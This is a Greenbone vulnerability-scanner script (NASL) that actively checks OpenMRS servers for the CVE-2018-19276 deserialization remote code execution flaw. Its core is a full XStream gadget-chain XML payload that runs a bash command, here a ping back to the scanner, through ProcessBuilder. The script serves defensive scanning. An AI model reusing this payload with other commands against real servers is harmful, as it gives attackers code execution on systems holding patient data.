# SPDX-FileCopyrightText: 2019 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:openmrs:openmrs";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.142136");
  script_version("2024-11-13T05:05:39+0000");
  script_tag(name:"last_modification", value:"2024-11-13 05:05:39 +0000 (Wed, 13 Nov 2024)");
  script_tag(name:"creation_date", value:"2019-03-13 09:16:06 +0700 (Wed, 13 Mar 2019)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"severity_vector", value:"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2023-03-03 18:20:00 +0000 (Fri, 03 Mar 2023)");

  script_cve_id("CVE-2018-19276");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("OpenMRS RCE Vulnerability (Feb 2019) - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2019 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_openmrs_detect.nasl", "os_detection.nasl");
  script_mandatory_keys("openmrs/detected");
  script_require_ports("Services/www", 443);

  script_tag(name:"summary", value:"OpenMRS is prone to a remote code execution (RCE)
  vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP POST request and checks if the target is
  connecting back to the scanner host.

  Note: For a successful detection of this flaw the scanner host needs to be able to directly
  receive ICMP echo requests from the target.");

  script_tag(name:"solution", value:"Update the webservices.rest module of OpenMRS to version 2.24.0
  or later.");

  script_xref(name:"URL", value:"https://talk.openmrs.org/t/critical-security-advisory-cve-2018-19276-2019-02-04/21607");
  script_xref(name:"URL", value:"https://www.bishopfox.com/news/2019/02/openmrs-insecure-object-deserialization/");

  exit(0);
}

include("dump.inc");
include("host_details.inc");
include("os_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("list_array_func.inc");
include("pcap_func.inc");

if (!port = get_app_port(cpe: CPE))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

url = dir + "/ws/rest/v1/concept";
headers = make_array("Content-Type", "application/xml");

req = http_post_put_req(port: port, url: url, data: "", add_headers: headers);
res = http_keepalive_send_recv(port: port, data: req);

if (!res || res !~ "^HTTP/1\.[01] 500")
  exit(0);

ownhostname = this_host_name();
ownip = this_host();
src_filter = pcap_src_ip_filter_from_hostnames();
dst_filter = string("(dst host ", ownip, " or dst host ", ownhostname, ")");
filter = string("icmp and icmp[0] = 8 and ", src_filter, " and ", dst_filter);

if (os_host_runs( "Windows") == "yes")
  target_runs_windows = TRUE;

foreach connect_back_target (make_list(ownip, ownhostname)) {

  vtstrings = get_vt_strings();
  check = vtstrings["ping_string"];
  pattern = hexstr(check);

  if (target_runs_windows)
    cmd = "ping -n 5 " + connect_back_target;
  else
    cmd = "ping -c 5 -p " + pattern + " " + connect_back_target;

  data = '<map>\r\n  <entry>\r\n    <jdk.nashorn.internal.objects.NativeString>\r\n      <flags>0</flags>\r\n' +
         '     <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">\r\n' +
         '        <dataHandler>\r\n          <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">\r\n' +
         '            <is class="javax.crypto.CipherInputStream">\r\n' +
         '              <cipher class="javax.crypto.NullCipher">\r\n' +
         '                <initialized>false</initialized>\r\n                <opmode>0</opmode>\r\n' +
         '                <serviceIterator class="javax.imageio.spi.FilterIterator">\r\n' +
         '                  <iter class="javax.imageio.spi.FilterIterator">\r\n' +
         '                    <iter class="java.util.Collections$EmptyIterator"/>\r\n' +
         '                    <next class="java.lang.ProcessBuilder">\r\n' +
         '                      <command>\r\n                        <string>/bin/bash</string>\r\n' +
         '                        <string>-c</string>\r\n  \t\t\t' +
         '<string>' + cmd + '</string>\r\n                      </command>\r\n' +
         '                      <redirectErrorStream>false</redirectErrorStream>\r\n' +
         '                    </next>\r\n                  </iter>\r\n' +
         '                  <filter class="javax.imageio.ImageIO$ContainsFilter">\r\n' +
         '                    <method>\r\n                      <class>java.lang.ProcessBuilder</class>\r\n' +
         '                      <name>start</name>\r\n                      <parameter-types/>\r\n' +
         '                    </method>\r\n                    <name>foo</name>\r\n                  </filter>\r\n' +
         '                  <next class="string">foo</next>\r\n                </serviceIterator>\r\n' +
         '                <lock/>\r\n              </cipher>\r\n' +
         '              <input class="java.lang.ProcessBuilder$NullInputStream"/>\r\n' +
         '              <ibuffer></ibuffer>\r\n              <done>false</done>\r\n' +
         '              <ostart>0</ostart>\r\n              <ofinish>0</ofinish>\r\n' +
         '              <closed>false</closed>\r\n            </is>\r\n            <consumed>false</consumed>\r\n' +
         '          </dataSource>\r\n          <transferFlavors/>\r\n        </dataHandler>\r\n' +
         '        <dataLen>0</dataLen>\r\n      </value>\r\n    </jdk.nashorn.internal.objects.NativeString>\r\n' +
         '    <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/>\r\n' +
         '  </entry>\r\n  <entry>\r\n' +
         '    <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>\r\n' +
         '    <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>\r\n' +
         '  </entry>\r\n</map>';

  req = http_post_put_req(port: port, url: url, data: data, add_headers: headers);

  # nb: Always keep open_sock_tcp() after the first call of a function forking on multiple hostnames /
  # vhosts (e.g. http_get(), http_post_put_req(), http_host_name(), get_host_name(), ...). Reason: If
  # the fork would be done after calling open_sock_tcp() the child's would share the same socket
  # causing race conditions and similar.
  if (!soc = open_sock_tcp(port))
    continue;

  res = send_capture(socket: soc, data: req, timeout: 5, pcap_filter: filter);

  close(soc);

  if (!res)
    continue;

  type = get_icmp_element(icmp: res, element: "icmp_type");
  if (!type || type != 8)
    continue;

  # nb: If understanding https://datatracker.ietf.org/doc/html/rfc792 correctly the "data" field
  # should be always there. In addition at least standard Linux and Windows systems are always
  # sending data so it should be safe to check this here.
  if (!data = get_icmp_element(icmp: res, element: "data"))
    continue;

  if ((target_runs_windows || check >< data)) {
    report = http_report_vuln_url(port: port, url: url);
    report += '\n\nIt was possible to execute the command "' + cmd + '" on the remote host.\n\nReceived answer (ICMP "Data" field):\n\n' + hexdump(ddata: data);
    security_message(port: port, data: report);
    exit(0);
  }
}

# nb: Don't use exit(99); as we can't be sure that the target isn't affected if e.g. the scanner
# host isn't reachable by the target host or another IP is responding from our request.
exit(0);
